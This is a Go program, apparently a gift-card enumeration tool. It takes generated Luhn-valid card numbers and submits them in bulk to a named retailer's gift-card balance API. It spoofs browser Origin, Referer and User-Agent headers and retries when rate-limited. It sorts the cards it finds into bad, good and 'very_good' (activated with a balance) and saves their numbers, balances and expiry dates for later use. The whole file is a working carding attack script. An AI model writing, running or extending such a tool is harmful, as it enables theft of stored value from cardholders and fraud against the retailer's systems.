package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// API Response Structures
type Card struct {
	CardNumber     string  `json:"CardNumber"`
	CardStatus     string  `json:"CardStatus"`
	Balance        float64 `json:"Balance"`
	ExpiryDate     string  `json:"ExpiryDate"`
	ResponseCode   int     `json:"ResponseCode"`
	ResponseMessage string `json:"ResponseMessage"`
}

type APIResponse struct {
	ResponseCode    int    `json:"ResponseCode"`
	ResponseMessage string `json:"ResponseMessage"`
	NumberOfCards   int    `json:"NumberOfCards"`
	Cards           []Card `json:"Cards"`
}

// Card Result for categorization
type CardResult struct {
	CardNumber    string
	Status        string // "bad", "good", "very_good", "failed"
	Balance       float64
	ExpiryDate    string
	CardStatus    string
	DumpFilePath  string
	FullResponse  []byte
}

// Configuration
const (
	API_URL        = "https://api.croma.com/qwikcilver/v1/transactions"
	CONCURRENCY    = 8
	CARDS_PER_FILE = 10000
	DUMP_PER_FILE  = 100
	BATCH_SAVE_SIZE = 500 // Save results every 50k cards
)

var (
	badCounter      int32
	goodCounter     int32
	veryGoodCounter int32
	failedCounter   int32
	processedCount  int32
	totalCount      int32
	retryCounter    int32
	batchNumber     int32
	lastSavedCount  int32
)

func main() {
	fmt.Println("=== Card Status Checker ===")
	fmt.Println("Concurrency:", CONCURRENCY)
	fmt.Println()

	// Get file selection from user
	files := selectFiles()
	if len(files) == 0 {
		log.Fatal("No files selected")
	}

	fmt.Printf("Selected %d file(s) to process\n\n", len(files))

	// Create output directories
	createDirectories()

	// Read all card numbers from selected files
	cardNumbers := readCardNumbers(files)
	totalCount = int32(len(cardNumbers))
	fmt.Printf("Total card numbers to check: %d\n\n", totalCount)

	// Start progress monitor
	go monitorProgress()

	// Process cards with concurrency
	results := processCards(cardNumbers)

	// Save results
	saveResults(results)

	// Print summary
	printSummary()
}

func selectFiles() []string {
	fmt.Println("Enter file selection:")
	fmt.Println("  * = All files")
	fmt.Println("  Or comma-separated files: luhn_numbers_10.txt,luhn_numbers_11.txt,luhn_numbers_12.txt")
	fmt.Print("\nSelection: ")

	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	if input == "*" {
		// Get all files from luhn_number directory
		files, err := filepath.Glob("luhn_number/luhn_numbers_*.txt")
		if err != nil {
			log.Fatal("Error reading directory:", err)
		}
		return files
	}

	// Parse comma-separated files
	fileList := strings.Split(input, ",")
	var files []string
	for _, f := range fileList {
		f = strings.TrimSpace(f)
		if f != "" {
			files = append(files, filepath.Join("luhn_number", f))
		}
	}
	return files
}

func createDirectories() {
	dirs := []string{
		"status_check/bad",
		"status_check/good",
		"status_check/very_good",
		"status_check/failed",
		"dump_meta_data/good",
		"dump_meta_data/very_good",
	}

	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Fatal("Error creating directory:", err)
		}
	}
}

func readCardNumbers(files []string) []string {
	var allNumbers []string

	for _, file := range files {
		f, err := os.Open(file)
		if err != nil {
			log.Printf("Warning: Could not open %s: %v\n", file, err)
			continue
		}

		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			number := strings.TrimSpace(scanner.Text())
			if number != "" {
				allNumbers = append(allNumbers, number)
			}
		}
		f.Close()
	}

	return allNumbers
}

func processCards(cardNumbers []string) []CardResult {
	results := make([]CardResult, 0)
	resultsMutex := &sync.Mutex{}

	// Create semaphore for concurrency control
	semaphore := make(chan struct{}, CONCURRENCY)
	var wg sync.WaitGroup

	for _, cardNumber := range cardNumbers {
		wg.Add(1)
		semaphore <- struct{}{} // Acquire

		go func(num string) {
			defer wg.Done()
			defer func() { <-semaphore }() // Release

			result := checkCard(num)
			
			resultsMutex.Lock()
			results = append(results, result)
			resultsMutex.Unlock()

			processed := atomic.AddInt32(&processedCount, 1)
			
			// Check if we've processed 50k cards since last save
			if processed % BATCH_SAVE_SIZE == 0 {
				resultsMutex.Lock()
				batchResults := make([]CardResult, len(results))
				copy(batchResults, results)
				results = make([]CardResult, 0) // Clear for next batch
				resultsMutex.Unlock()
				
				batchNum := atomic.AddInt32(&batchNumber, 1)
				fmt.Printf("\n[BATCH %d] Saving %d results...\n", batchNum, len(batchResults))
				saveBatchResults(batchResults, int(batchNum))
				atomic.StoreInt32(&lastSavedCount, processed)
			}
			
			// Small delay to avoid overwhelming API
			time.Sleep(10 * time.Millisecond)
		}(cardNumber)
	}

	wg.Wait()
	
	// Save any remaining results
	if len(results) > 0 {
		batchNum := atomic.AddInt32(&batchNumber, 1)
		fmt.Printf("\n[FINAL BATCH %d] Saving %d remaining results...\n", batchNum, len(results))
		saveBatchResults(results, int(batchNum))
	}
	
	return results
}

func checkCard(cardNumber string) CardResult {
	result := CardResult{
		CardNumber: cardNumber,
		Status:     "failed",
	}

	// Retry logic - up to 2 attempts for failed requests
	maxRetries := 2
	for attempt := 0; attempt < maxRetries; attempt++ {
		if attempt > 0 {
			atomic.AddInt32(&retryCounter, 1)
			time.Sleep(time.Duration(attempt*300) * time.Millisecond) // Backoff: 300ms, 600ms
		}

		// Prepare request payload
		payload := map[string]interface{}{
			"TransactionTypeId": 306,
			"InputType":         "1",
			"Cards": []map[string]string{
				{"CardNumber": cardNumber},
			},
		}

		jsonData, _ := json.Marshal(payload)

		// Create HTTP request
		req, err := http.NewRequest("POST", API_URL, bytes.NewBuffer(jsonData))
		if err != nil {
			if attempt == maxRetries-1 {
				log.Printf("[FAILED] Error creating request for %s: %v\n", cardNumber, err)
			}
			continue
		}

		// Set headers (from good_request.md)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Accept", "application/json, text/plain, */*")
		req.Header.Set("Origin", "https://www.croma.com")
		req.Header.Set("Referer", "https://www.croma.com/")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36")

		// Make request with timeout
		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			if attempt == maxRetries-1 {
				log.Printf("[FAILED] Network error for %s (attempt %d): %v\n", cardNumber, attempt+1, err)
			}
			continue
		}
		defer resp.Body.Close()

		// Check for rate limiting
		if resp.StatusCode == 429 {
			log.Printf("[RETRY] Rate limited for %s, waiting...\n", cardNumber)
			time.Sleep(2 * time.Second)
			continue
		}

		// Check for non-200 status codes
		if resp.StatusCode != 200 {
			if attempt == maxRetries-1 {
				log.Printf("[FAILED] HTTP %d for %s\n", resp.StatusCode, cardNumber)
			}
			continue
		}

		// Read response
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			if attempt == maxRetries-1 {
				log.Printf("[FAILED] Error reading response for %s: %v\n", cardNumber, err)
			}
			continue
		}

		// Parse response
		var apiResp APIResponse
		if err := json.Unmarshal(body, &apiResp); err != nil {
			if attempt == maxRetries-1 {
				log.Printf("[FAILED] Error parsing JSON for %s: %v\n", cardNumber, err)
			}
			continue
		}

		// Store full response
		result.FullResponse = body

		// MAIN LOGIC: Check based on CardStatus
		if len(apiResp.Cards) > 0 {
			card := apiResp.Cards[0]
			result.CardStatus = card.CardStatus
			result.Balance = card.Balance
			result.ExpiryDate = card.ExpiryDate

			// CardStatus = "Activated" means good card
			if card.CardStatus == "Activated" {
				if card.Balance > 0 {
					result.Status = "very_good"
					atomic.AddInt32(&veryGoodCounter, 1)
				} else {
					result.Status = "good"
					atomic.AddInt32(&goodCounter, 1)
				}
				return result // Success!
			}

			// CardStatus = null or empty means bad card
			if card.CardStatus == "" || card.CardStatus == "null" {
				result.Status = "bad"
				atomic.AddInt32(&badCounter, 1)
				return result // Valid bad card
			}

			// Other CardStatus (e.g., "Blocked", "Expired") = bad
			result.Status = "bad"
			atomic.AddInt32(&badCounter, 1)
			return result
		} else {
			// No cards in response = bad
			result.Status = "bad"
			atomic.AddInt32(&badCounter, 1)
			return result
		}
	}

	// All retries failed - mark as failed request
	log.Printf("[FAILED] All %d retries exhausted for %s\n", maxRetries, cardNumber)
	result.Status = "failed"
	atomic.AddInt32(&failedCounter, 1)
	return result
}

func saveBatchResults(results []CardResult, batchNum int) {
	// Separate results by status
	badResults := []CardResult{}
	goodResults := []CardResult{}
	veryGoodResults := []CardResult{}
	failedResults := []CardResult{}

	for _, r := range results {
		switch r.Status {
		case "bad":
			badResults = append(badResults, r)
		case "good":
			goodResults = append(goodResults, r)
		case "very_good":
			veryGoodResults = append(veryGoodResults, r)
		case "failed":
			failedResults = append(failedResults, r)
		}
	}

	// Save each category with batch-aware file naming
	appendBadCards(badResults, batchNum)
	appendFailedCards(failedResults, batchNum)
	appendGoodCards(goodResults, batchNum)
	appendVeryGoodCards(veryGoodResults, batchNum)
	appendDumpMetadata(goodResults, "good", batchNum)
	appendDumpMetadata(veryGoodResults, "very_good", batchNum)
	
	fmt.Printf("✓ Batch %d saved: %d bad, %d good, %d very_good, %d failed\n", 
		batchNum, len(badResults), len(goodResults), len(veryGoodResults), len(failedResults))
}

func saveResults(results []CardResult) {
	fmt.Println("\n\nSaving results...")

	// Separate results by status
	badResults := []CardResult{}
	goodResults := []CardResult{}
	veryGoodResults := []CardResult{}
	failedResults := []CardResult{}

	for _, r := range results {
		switch r.Status {
		case "bad":
			badResults = append(badResults, r)
		case "good":
			goodResults = append(goodResults, r)
		case "very_good":
			veryGoodResults = append(veryGoodResults, r)
		case "failed":
			failedResults = append(failedResults, r)
		}
	}

	// Save bad cards (card numbers only, 10k per file)
	saveBadCards(badResults)

	// Save failed cards (card numbers only, 10k per file)
	saveFailedCards(failedResults)

	// Save good cards (with metadata references, 10k per file)
	saveGoodCards(goodResults)

	// Save very good cards (with metadata references, 10k per file)
	saveVeryGoodCards(veryGoodResults)

	// Save dump metadata (100 per file)
	saveDumpMetadata(goodResults, "good")
	saveDumpMetadata(veryGoodResults, "very_good")

	fmt.Println("✓ All results saved successfully!")
}

func appendBadCards(results []CardResult, batchNum int) {
	if len(results) == 0 {
		return
	}
	
	// Append to current file or create new one based on count
	currentFile := getOrCreateFile("status_check/bad/bad_cards", atomic.LoadInt32(&badCounter)-int32(len(results)))
	for _, r := range results {
		fmt.Fprintln(currentFile, r.CardNumber)
	}
	currentFile.Close()
}

func saveBadCards(results []CardResult) {
	fileIndex := 1
	for i := 0; i < len(results); i += CARDS_PER_FILE {
		end := i + CARDS_PER_FILE
		if end > len(results) {
			end = len(results)
		}

		filename := fmt.Sprintf("status_check/bad/bad_cards_%d.txt", fileIndex)
		file, _ := os.Create(filename)
		
		for _, r := range results[i:end] {
			fmt.Fprintln(file, r.CardNumber)
		}
		
		file.Close()
		fileIndex++
	}
}

func appendFailedCards(results []CardResult, batchNum int) {
	if len(results) == 0 {
		return
	}
	
	currentFile := getOrCreateFile("status_check/failed/failed_requests", atomic.LoadInt32(&failedCounter)-int32(len(results)))
	for _, r := range results {
		fmt.Fprintln(currentFile, r.CardNumber)
	}
	currentFile.Close()
}

func saveFailedCards(results []CardResult) {
	fileIndex := 1
	for i := 0; i < len(results); i += CARDS_PER_FILE {
		end := i + CARDS_PER_FILE
		if end > len(results) {
			end = len(results)
		}

		filename := fmt.Sprintf("status_check/failed/failed_requests_%d.txt", fileIndex)
		file, _ := os.Create(filename)
		
		for _, r := range results[i:end] {
			fmt.Fprintln(file, r.CardNumber)
		}
		
		file.Close()
		fileIndex++
	}
}

func appendGoodCards(results []CardResult, batchNum int) {
	if len(results) == 0 {
		return
	}
	
	currentFile := getOrCreateFile("status_check/good/good_cards", atomic.LoadInt32(&goodCounter)-int32(len(results)))
	for _, r := range results {
		dumpFileIndex := (atomic.LoadInt32(&goodCounter) / DUMP_PER_FILE) + 1
		dumpPath := fmt.Sprintf("dump_meta_data/good/response_%d.txt", dumpFileIndex)
		fmt.Fprintf(currentFile, "%s | %s\n", r.CardNumber, dumpPath)
	}
	currentFile.Close()
}

func saveGoodCards(results []CardResult) {
	fileIndex := 1
	for i := 0; i < len(results); i += CARDS_PER_FILE {
		end := i + CARDS_PER_FILE
		if end > len(results) {
			end = len(results)
		}

		filename := fmt.Sprintf("status_check/good/good_cards_%d.txt", fileIndex)
		file, _ := os.Create(filename)
		
		for j, r := range results[i:end] {
			dumpFileIndex := ((i + j) / DUMP_PER_FILE) + 1
			dumpPath := fmt.Sprintf("dump_meta_data/good/response_%d.txt", dumpFileIndex)
			fmt.Fprintf(file, "%s | %s\n", r.CardNumber, dumpPath)
		}
		
		file.Close()
		fileIndex++
	}
}

func appendVeryGoodCards(results []CardResult, batchNum int) {
	if len(results) == 0 {
		return
	}
	
	currentFile := getOrCreateFile("status_check/very_good/very_good_cards", atomic.LoadInt32(&veryGoodCounter)-int32(len(results)))
	for _, r := range results {
		dumpFileIndex := (atomic.LoadInt32(&veryGoodCounter) / DUMP_PER_FILE) + 1
		dumpPath := fmt.Sprintf("dump_meta_data/very_good/response_%d.txt", dumpFileIndex)
		fmt.Fprintf(currentFile, "%s | Balance: %.2f | Expiry: %s | %s\n", 
			r.CardNumber, r.Balance, r.ExpiryDate, dumpPath)
	}
	currentFile.Close()
}

func saveVeryGoodCards(results []CardResult) {
	fileIndex := 1
	for i := 0; i < len(results); i += CARDS_PER_FILE {
		end := i + CARDS_PER_FILE
		if end > len(results) {
			end = len(results)
		}

		filename := fmt.Sprintf("status_check/very_good/very_good_cards_%d.txt", fileIndex)
		file, _ := os.Create(filename)
		
		for j, r := range results[i:end] {
			dumpFileIndex := ((i + j) / DUMP_PER_FILE) + 1
			dumpPath := fmt.Sprintf("dump_meta_data/very_good/response_%d.txt", dumpFileIndex)
			fmt.Fprintf(file, "%s | Balance: %.2f | Expiry: %s | %s\n", 
				r.CardNumber, r.Balance, r.ExpiryDate, dumpPath)
		}
		
		file.Close()
		fileIndex++
	}
}

func appendDumpMetadata(results []CardResult, category string, batchNum int) {
	if len(results) == 0 {
		return
	}
	
	for _, r := range results {
		var counter int32
		if category == "good" {
			counter = atomic.LoadInt32(&goodCounter)
		} else {
			counter = atomic.LoadInt32(&veryGoodCounter)
		}
		
		fileIndex := ((counter - int32(len(results))) / DUMP_PER_FILE) + 1
		filename := fmt.Sprintf("dump_meta_data/%s/response_%d.txt", category, fileIndex)
		file, _ := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		
		fmt.Fprintf(file, "=== Card: %s ===\n", r.CardNumber)
		file.Write(r.FullResponse)
		fmt.Fprintln(file, "\n")
		file.Close()
	}
}

func getOrCreateFile(basePath string, currentCount int32) *os.File {
	fileIndex := (currentCount / CARDS_PER_FILE) + 1
	filename := fmt.Sprintf("%s_%d.txt", basePath, fileIndex)
	file, _ := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	return file
}

func saveDumpMetadata(results []CardResult, category string) {
	fileIndex := 1
	for i := 0; i < len(results); i += DUMP_PER_FILE {
		end := i + DUMP_PER_FILE
		if end > len(results) {
			end = len(results)
		}

		filename := fmt.Sprintf("dump_meta_data/%s/response_%d.txt", category, fileIndex)
		file, _ := os.Create(filename)
		
		for _, r := range results[i:end] {
			fmt.Fprintf(file, "=== Card: %s ===\n", r.CardNumber)
			file.Write(r.FullResponse)
			fmt.Fprintln(file, "\n")
		}
		
		file.Close()
		fileIndex++
	}
}

func monitorProgress() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		processed := atomic.LoadInt32(&processedCount)
		total := atomic.LoadInt32(&totalCount)
		
		if processed >= total {
			return
		}

		bad := atomic.LoadInt32(&badCounter)
		good := atomic.LoadInt32(&goodCounter)
		veryGood := atomic.LoadInt32(&veryGoodCounter)
		failed := atomic.LoadInt32(&failedCounter)
		lastSaved := atomic.LoadInt32(&lastSavedCount)
		
		percentage := float64(processed) / float64(total) * 100
		nextSave := ((processed / BATCH_SAVE_SIZE) + 1) * BATCH_SAVE_SIZE
		
		fmt.Printf("\rProgress: %d/%d (%.1f%%) | Bad: %d | Good: %d | VeryGood: %d | Failed: %d | LastSaved: %d | NextSave: %d",
			processed, total, percentage, bad, good, veryGood, failed, lastSaved, nextSave)
	}
}

func printSummary() {
	fmt.Println("\n\n=== Final Summary ===")
	fmt.Printf("Total Processed: %d\n", processedCount)
	fmt.Printf("Bad Cards (CardStatus=null): %d\n", badCounter)
	fmt.Printf("Good Cards (Activated, Balance=0): %d\n", goodCounter)
	fmt.Printf("Very Good Cards (Activated, Balance>0): %d\n", veryGoodCounter)
	fmt.Printf("Failed Requests (Network/Parse Error): %d\n", failedCounter)
	fmt.Printf("Retries Attempted: %d\n", retryCounter)
	fmt.Println("\n✓ Check 'status_check/' and 'dump_meta_data/' folders for results")
	fmt.Println("⚠ Check console logs above for any error details")
	fmt.Println("\n📁 Folder Structure:")
	fmt.Println("  - status_check/bad/ = Invalid cards (CardStatus is null)")
	fmt.Println("  - status_check/good/ = Valid cards with 0 balance")
	fmt.Println("  - status_check/very_good/ = Valid cards with balance > 0")
	fmt.Println("  - status_check/failed/ = Network/API errors (retry these later)")
}
